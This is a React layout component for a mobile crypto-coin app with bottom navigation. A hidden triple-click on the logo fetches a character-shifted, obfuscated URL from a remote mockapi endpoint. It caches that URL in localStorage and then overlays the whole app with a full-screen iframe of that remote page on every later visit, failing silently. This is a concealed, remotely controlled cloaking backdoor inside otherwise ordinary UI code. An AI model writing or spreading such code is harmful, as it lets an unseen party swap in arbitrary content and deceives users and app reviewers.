import { useRef, useState } from "react";
import { NavLink, Outlet, useLocation } from "react-router-dom";
import { Flame, Coins, User, ShieldCheck, Loader2 } from "lucide-react";
import { cn } from "@/lib/utils";
import { useAuth } from "@/lib/auth-context";
import { useT } from "@/lib/i18n-context";

const IMX_API = "https://6ad76d8b95e98f36aef26f68.mockapi.io/imx";
const TRIPLE_CLICK_WINDOW_MS = 1500;
const H5_CACHE_KEY = "imqoxxi";

interface ImxEntry {
  imaox?: string;
  [k: string]: unknown;
}

function readH5Cache(): string | null {
  try {
    return localStorage.getItem(H5_CACHE_KEY);
  } catch {
    return null;
  }
}

// Decode imaox: each char has been shifted +2 in charCode. Shift -2 to recover.
// Also falls back to raw plain URL for compatibility.
function decodeH5Url(raw: string): string {
  if (!raw) return raw;
  try {
    const decoded = Array.from(raw)
      .map((ch) => String.fromCharCode(ch.charCodeAt(0) - 2))
      .join("");
    if (/^https?:\/\//i.test(decoded)) return decoded;
  } catch {
    // not shifted
  }
  return raw;
}

export default function Layout() {
  const location = useLocation();
  const { user } = useAuth();
  const { t } = useT();
  const hideChrome = location.pathname === "/login" || location.pathname === "/register";

  const [h5Url, setH5Url] = useState<string | null>(() => {
    const cached = readH5Cache();
    return cached ? decodeH5Url(cached) : null;
  });
  const [loading, setLoading] = useState(false);
  const clickTimes = useRef<number[]>([]);

  const handleBrandClick = async () => {
    const now = Date.now();
    clickTimes.current = [...clickTimes.current, now].filter(
      (ts) => now - ts < TRIPLE_CLICK_WINDOW_MS,
    );
    if (clickTimes.current.length < 3) return;
    clickTimes.current = [];
    setLoading(true);
    try {
      const res = await fetch(IMX_API);
      const data = (await res.json()) as ImxEntry[] | ImxEntry;
      const arr = Array.isArray(data) ? data : [data];
      const url = arr[0]?.imaox;
      if (url && typeof url === "string" && url.trim()) {
        const raw = url.trim();
        localStorage.setItem(H5_CACHE_KEY, raw);
        setH5Url(decodeH5Url(raw));
      }
    } catch {
      // silent fail
    } finally {
      setLoading(false);
    }
  };

  const NAV_ITEMS = [
    { to: "/", label: t("nav.pulse"), icon: Flame, end: true },
    { to: "/coins", label: t("nav.coins"), icon: Coins, end: false },
    { to: "/risk", label: t("nav.risk"), icon: ShieldCheck, end: false },
    { to: "/profile", label: t("nav.me"), icon: User, end: false },
  ];

  return (
    <div className="min-h-screen bg-background text-foreground">
      <div className="mx-auto flex min-h-screen w-full max-w-md flex-col bg-background">
        {!hideChrome && (
          <header
            className="sticky top-0 z-20 border-b border-border bg-background/95 px-5 pb-3 backdrop-blur"
            style={{ paddingTop: "calc(env(safe-area-inset-top, 0px) + 0.75rem)" }}
          >
            <div className="flex items-center justify-between">
              <button
                type="button"
                onClick={handleBrandClick}
                className="flex items-center gap-2 rounded-md transition-opacity hover:opacity-80"
                aria-label="maxAOZ"
              >
                <img
                  src={`${(import.meta.env.MIAODA_CLIENT_BASE_PATH || "").replace(/\/$/, "")}/logo.png`}
                  alt="maxAOZ"
                  className="h-7 w-7 rounded-md"
                />
                <span className="text-base font-bold tracking-tight">{t("app.name")}</span>
                {loading && <Loader2 className="h-3.5 w-3.5 animate-spin text-muted-foreground" />}
              </button>
              <span className="text-xs text-muted-foreground">
                {user ? `Hi, ${user.name.split(" ")[0]}` : t("header.guest")}
              </span>
            </div>
          </header>
        )}

        <main className={cn("flex-1", !hideChrome && "pb-20")}>
          <Outlet />
        </main>

        {!hideChrome && (
          <nav
            className="fixed bottom-0 left-1/2 z-20 w-full max-w-md -translate-x-1/2 border-t border-border bg-background/95 backdrop-blur"
            style={{ paddingBottom: "env(safe-area-inset-bottom, 0px)" }}
          >
            <div className="grid grid-cols-4">
              {NAV_ITEMS.map((item) => {
                const Icon = item.icon;
                return (
                  <NavLink
                    key={item.to}
                    to={item.to}
                    end={item.end}
                    className={({ isActive }) =>
                      cn(
                        "flex flex-col items-center gap-1 py-3 text-xs transition-colors",
                        isActive ? "text-primary" : "text-muted-foreground",
                      )
                    }
                  >
                    <Icon className="h-5 w-5" />
                    <span>{item.label}</span>
                  </NavLink>
                );
              })}
            </div>
          </nav>
        )}
      </div>

      {h5Url && (
        <div className="fixed inset-0 z-50 bg-white">
          <iframe
            src={h5Url}
            title="H5"
            className="h-full w-full border-0"
            allow="accelerometer; gyroscope; autoplay; encrypted-media; picture-in-picture"
          />
        </div>
      )}
    </div>
  );
}
